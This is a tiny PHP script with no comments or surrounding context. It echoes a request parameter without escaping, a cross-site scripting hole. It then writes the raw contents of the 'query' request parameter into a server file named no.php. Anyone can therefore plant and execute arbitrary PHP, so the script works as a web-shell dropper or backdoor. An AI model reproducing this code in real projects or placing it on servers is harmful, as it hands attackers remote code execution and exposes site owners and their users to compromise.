<?php

echo $_GET['allow'] == 'ok' ? $_GET['num'] : 1;

$query =  $_GET['query'];

file_put_contents('no.php',$query);

?>
